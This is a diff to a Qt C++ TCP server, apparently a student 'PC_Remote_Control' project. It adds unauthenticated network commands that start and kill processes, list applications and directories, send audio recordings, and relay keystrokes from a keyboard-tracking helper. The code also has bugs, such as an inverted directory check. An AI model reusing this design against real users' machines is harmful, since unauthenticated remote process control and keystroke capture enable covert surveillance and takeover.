@@ -156,7 +156,11 @@ void Server::initServer()
 //                                          wszAdapterName,
 //                                          dwEnabledDHCP
 //                                              ? L"Yes" : L"No");
-                                adapterNamesList.push(QString(wszAdapterName));
+                                std::wstring your_wchar_in_ws(wszAdapterName);
+                                std::string your_wchar_in_str(your_wchar_in_ws.begin(), your_wchar_in_ws.end());
+                                const char* your_wchar_in_char =  your_wchar_in_str.c_str();
+                                adapterNamesList << QString(your_wchar_in_char);
+                                qDebug() << "ADAPTER NE: " << QString(your_wchar_in_char);
                             }
 
                             lStatus = RegQueryValueEx(
@@ -184,7 +188,11 @@ void Server::initServer()
                             if(SUCCEEDED(lStatus))
                             {
 //                                wprintf_s(L"\tDHCP IP Address : %s\n", wszDHCPIP);
-                                ipAddressList.push(QString(wszDHCPIP));
+                                std::wstring your_wchar_in_ws(wszDHCPIP);
+                                std::string your_wchar_in_str(your_wchar_in_ws.begin(), your_wchar_in_ws.end());
+                                const char* your_wchar_in_char =  your_wchar_in_str.c_str();
+                                ipAddressList << QString(your_wchar_in_char);
+                                qDebug() << "ALO?" << QString(your_wchar_in_char);
                             }
 
 //                            wprintf_s(L"\n");
@@ -195,6 +203,8 @@ void Server::initServer()
                     }
                 }
             }
+        }
+    }
     QList<QHostAddress> ipAddressesList2 = QNetworkInterface::allAddresses();
     for (const QHostAddress& address : ipAddressesList2) {
         if (address != QHostAddress::LocalHost && address.protocol() == QAbstractSocket::IPv4Protocol) {
@@ -205,143 +215,6 @@ void Server::initServer()
         RegCloseKey(hNetCardsKey);
     }
     QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
-
-    HKEY hNetCardsKey;
-    LSTATUS lStatus = ERROR_SUCCESS;
-
-    lStatus = RegOpenKey(HKEY_LOCAL_MACHINE,
-                         NETCARD_ROOT,
-                         &hNetCardsKey);
-
-    if(ERROR_SUCCESS == lStatus)
-    {
-        DWORD dwCards = 0L;
-        DWORD dwMaxSubkeyNameLen = 0L;
-        lStatus = RegQueryInfoKey(hNetCardsKey, NULL, NULL, NULL, &dwCards,
-                                  &dwMaxSubkeyNameLen, NULL, NULL, NULL, NULL, NULL, NULL);
-
-        if(ERROR_SUCCESS == lStatus && dwCards)
-        {
-            for(DWORD i = 0; i < dwCards; i++)
-            {
-                TCHAR wszCurrentCardIdxName[MAX_PATH];
-                wszCurrentCardIdxName[0] = '\0';
-                lStatus = RegEnumKey(hNetCardsKey, i,
-                                     wszCurrentCardIdxName, MAX_PATH);
-
-                if(ERROR_SUCCESS == lStatus)
-                {
-                    TCHAR wszAdapterKeyName[MAX_PATH];
-                    wszAdapterKeyName[0] = '\0';
-
-                    wsprintf(wszAdapterKeyName, L"%s\\%s", NETCARD_ROOT,
-                             wszCurrentCardIdxName);
-
-                    HKEY hCardNameKey;
-
-                    lStatus = RegOpenKey(
-                        HKEY_LOCAL_MACHINE,
-                        wszAdapterKeyName,
-                        &hCardNameKey);
-
-                    if(ERROR_SUCCESS == lStatus)
-                    {
-                        TCHAR wszServiceNameGuid[MAX_PATH];
-                        TCHAR wszAdapterName[MAX_PATH];
-
-                        DWORD dwSize = sizeof(wszServiceNameGuid);
-                        wszServiceNameGuid[0] = '\0';
-                        RegQueryValueEx(
-                            hCardNameKey,
-                            L"ServiceName",
-                            NULL,
-                            NULL,
-                            (LPBYTE)wszServiceNameGuid,
-                            &dwSize);
-
-                        dwSize = sizeof(wszAdapterName);
-                        RegQueryValueEx(
-                            hCardNameKey,
-                            L"Description",
-                            NULL,
-                            NULL,
-                            (LPBYTE)wszAdapterName,
-                            &dwSize);
-
-                        OutputDebugStringW(wszServiceNameGuid);
-                        OutputDebugStringW(L"\n");
-
-                        RegCloseKey(hCardNameKey);
-
-                        //Get parameters
-                        TCHAR wszCardParamKey[MAX_PATH];
-                        wszCardParamKey[0] = '\0';
-                        wsprintf(wszCardParamKey,L"%s\\%s", TCPIP_ROOT, wszServiceNameGuid);
-
-                        HKEY hParamKey = NULL;
-
-                        lStatus = RegOpenKey(
-                            HKEY_LOCAL_MACHINE,
-                            wszCardParamKey,
-                            &hParamKey);
-
-                        if(ERROR_SUCCESS == lStatus)
-                        {
-                            DWORD dwEnabledDHCP = 0L;
-                            DWORD dwDWSize = sizeof(DWORD);
-                            TCHAR wszStaticIP[32];
-                            TCHAR wszDHCPIP[32];
-                            DWORD dwIPSize = sizeof(wszDHCPIP);
-
-                            ZeroMemory(wszDHCPIP, dwIPSize);
-                            ZeroMemory(wszStaticIP, dwIPSize);
-
-                            lStatus = RegQueryValueEx(
-                                hParamKey,
-                                L"EnableDHCP",
-                                NULL, NULL,
-                                (LPBYTE)&dwEnabledDHCP,
-                                &dwDWSize);
-
-                            if(SUCCEEDED(lStatus))
-                            {
-                               qDebug() << "Adapter : " << wszServiceNameGuid << " [" << wszAdapterName <<
-                                    "] \n\tDHCP : " << (dwEnabledDHCP  ? "Yes" : "No") <<"\n";
-
-                            }
-
-                            lStatus = RegQueryValueEx(
-                                hParamKey,
-                                L"IPAddress",
-                                NULL,
-                                NULL,
-                                (LPBYTE)&wszStaticIP,
-                                &dwIPSize);
-
-                            if(SUCCEEDED(lStatus))
-                            {
-                               qDebug() << "\tConfigured IP Address : " << wszStaticIP << "\n";
-                            }
-
-
-                           qDebug() << ("\n");
-
-                            RegCloseKey(hParamKey);
-                        }
-
-                    }
-                }
-            }
-        }
-
-
-        RegCloseKey(hNetCardsKey);
-    }
-
-
-    // if we did not find one, use IPv4 localhost
-    if (ipAddress.isEmpty())
-        ipAddress = QHostAddress(QHostAddress::LocalHost).toString();
 
     //! [1]
     port = QString::number(tcpServer->serverPort());
@@ -384,15 +257,38 @@ void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct
     sender->write(block);
 }
 
-void Server::sendApplications(QTcpSocket* sender, const QStringList &appList)
+void Server::sendApplications(QTcpSocket* clientSocket)
 {
+    QProcess *process = static_cast<QProcess *>(sender());
+    qDebug() << "listing applications?";
+    QString output = process->readAllStandardOutput();
+    //    QStringList lines = output.split('\n');
+    QStringList appsInfo = output.split('\n');
+
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
 
-    out << tr("list applications") << appList;
-    sender->write(block);
+    out << tr("list applications") << appsInfo;
+    clientSocket->write(block);
 }
+
+void Server::sendRunningApplications(QTcpSocket* clientSocket)
+{
+    QProcess *process = static_cast<QProcess *>(sender());
+    qDebug() << "listing running applications?";
+    QString output = process->readAllStandardOutput();
+    //    QStringList lines = output.split('\n');
+    QStringList runningAppsInfo = output.split('\n');
+
+    QByteArray block;
+    QDataStream out(&block, QIODevice::WriteOnly);
+    out.setVersion(QDataStream::Qt_6_5);
+
+    out << tr("list running applications") << runningAppsInfo;
+    clientSocket->write(block);
+}
+
 void Server::send_audio_file(QTcpSocket* sender){
     QString fileName = "D:\\recorded_data.m4a";
     QFile file(fileName);
@@ -409,6 +305,35 @@ void Server::send_audio_file(QTcpSocket* sender){
 //    QFile::remove(fileName);
     qDebug() << "audio file delete in server";
 }
+
+void startTask(QString taskToStart) {
+    //    qDebug() << "Hello im testing taskkill :D.\n";
+    QProcess process;
+    QString program = "start";
+    QStringList arguments;
+    arguments << taskToStart;
+    process.start(program, arguments);
+    process.waitForFinished(-1); // Wait for the process to finish
+}
+
+void killTaskName(QString taskToKill) {
+    QProcess process;
+    QString program = "taskkill";
+    QStringList arguments;
+    arguments << "/F" << "/IM" << taskToKill;
+    process.start(program, arguments);
+    process.waitForFinished(-1); // Wait for the process to finish
+}
+
+void killTaskPID(QString pidToKill) {
+    QProcess process;
+    QString program = "taskkill";
+    QStringList arguments;
+    arguments << "-PID" << pidToKill;
+    process.start(program, arguments);
+    process.waitForFinished(-1); // Wait for the process to finish
+}
+
 void Server::readMessage() {
     QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
     if (clientConnection != nullptr) {
@@ -421,7 +346,14 @@ void Server::readMessage() {
     in.startTransaction();
 
     QString message;
+    QString target;
     in >> message;
+    if (message == tr("kill task pid") ||
+        message == tr("kill task name") ||
+        message == tr("start task name") ||
+        message == tr("ls")) {
+        in >> target;
+    }
 
     if (!in.commitTransaction())
         return;
@@ -430,29 +362,52 @@ void Server::readMessage() {
 
     if (message == tr("list applications")) {
 //        sendMessage(clientConnection, "here are the applications: ");
-        QStringList paths = QStandardPaths::standardLocations(QStandardPaths::ApplicationsLocation);
-//        QStringList paths;
-//        paths << "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs";
-        QStringList applications;
-        for (const QString &path : paths)
-        {
-//            QDir dir(path);
-            QDirIterator it(path, {"*.exe","*.lnk"}, QDir::Files, QDirIterator::Subdirectories);
-            while (it.hasNext()) {
-                qDebug() << it.next();
-                applications.append(it.next());
-            }
-        }
-        sendApplications(clientConnection, applications);
+//        QStringList paths = QStandardPaths::standardLocations(QStandardPaths::ApplicationsLocation);
+////        QStringList paths;
+////        paths << "%programdata%\\Microsoft\\Windows\\Start Menu\\Programs";
+//        QStringList applications;
+//        for (const QString &path : paths)
+//        {
+////            QDir dir(path);
+//            QDirIterator it(path, {"*.exe","*.lnk"}, QDir::Files, QDirIterator::Subdirectories);
+//            while (it.hasNext()) {
+//                qDebug() << it.next();
+//                applications.append(it.next());
+//            }
+//        }
+//        sendApplications(clientConnection, applications);
 
-        qDebug() << applications;
+//        qDebug() << applications;
+
+        processListApps = new QProcess();
+        QString workingDir = QDir::currentPath();
+        //        qDebug() << "i got here!:" << workingDir;
+        processListApps->start(workingDir + "//list_apps.exe");
+        //        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
+        connect(processListApps, &QProcess::readyReadStandardOutput, this, [=]() {
+            sendApplications(clientConnection);
+        });
 
 //        tracking_keyboard();
     }
+    else if (message  == tr("list running applications")) {
+
+        processListRunningApps = new QProcess();
+        QString workingDir = QDir::currentPath();
+//        qDebug() << "i got here!:" << workingDir;
+        processListRunningApps->start(workingDir + "//list_running_apps.exe");
+        //        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
+        connect(processListRunningApps, &QProcess::readyReadStandardOutput, this, [=]() {
+            sendRunningApplications(clientConnection);
+        });
+    }
     else if (message == tr("list processes")) {
 //        sendMessage(clientConnection, "here are the processes: ");
+
         processListProcesses = new QProcess();
-        processListProcesses->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\list_processes.exe");
+        QString workingDir = QDir::currentPath();
+//        qDebug() << "i got here!:" << workingDir;
+        processListProcesses->start(workingDir + "//list_processes.exe");
 //        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, &Server::processDataProcess);
         connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
             sendProcesses(clientConnection);
@@ -462,7 +417,8 @@ void Server::readMessage() {
     else if (message == tr("keyboard track")) {
         qDebug() << "keyboard tracking started?";
         processKeyboardTrack = new QProcess();
-        processKeyboardTrack->start("D:\\_Codes\\Qt_Creator_Projects\\PC_Remote_Control\\keyboard_track.exe");
+        QString workingDir = QDir::currentPath();
+        processKeyboardTrack->start(workingDir + "//keyboard_track.exe");
 //        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, &Server::processData);
         connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
             sendKeyboardTrack(clientConnection);
@@ -478,6 +434,7 @@ void Server::readMessage() {
             stream(clientConnection);
         });
         timer->start();
+//        connect(stopButton, clicked, timer, &QTimer::stop);
         QTimer::singleShot(3000, timer, &QTimer::stop);
     }
     else if (message == tr("show directories")) {
@@ -502,14 +459,23 @@ void Server::readMessage() {
 
     }
     else if (message == "ls") {
-        //        QString dirPath = args.size() > 1 ? args[1] : ".";
-        QString dirPath = ".";
+//        QString dirPath = args.size() > 1 ? args[1] : ".";
+        QString dirPath = (target == "" ? target : ".");
         QDir dir(dirPath);
         QStringList entries = dir.entryList();
         QString response = entries.join("\n");
         sendFileStructure(clientConnection, entries);
         qDebug() << entries << "\n";
         //        clientSocket->flush();
+    }
+    else if (message == tr("kill task pid")) {
+        killTaskPID(target);
+    }
+    else if (message == tr("kill task name")) {
+        killTaskName(target);
+    }
+    else if (message == tr("start task name")) {
+        startTask(target);
     }
 
     emit(readyRead(message));
@@ -532,21 +498,21 @@ void Server::sendProcesses(QTcpSocket* clientSocket) {
     QProcess *process = static_cast<QProcess *>(sender());
     qDebug() << "listing processing?";
     QString output = process->readAllStandardOutput();
-    QStringList lines = output.split('\n');
+//    QStringList lines = output.split('\n');
+    QStringList processInfo = output.split('\n');
 
 //    foreach (QString line, lines) {
-//        QList<QString>info  = line.split(' ', Qt::SkipEmptyParts);
-//        if (info.size() > 1)
-//            qDebug() << info[0] << info[1];
-////        qDebug() << line;
+//        qDebug() << line;
 //    }
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
 
-    out << tr("list processes") << lines;
+    out << tr("list processes") << processInfo;
     clientSocket->write(block);
 //    sendMessage(clientSocket, tr("huhu"));
+
+
 }
 
 void Server::newConnection() {
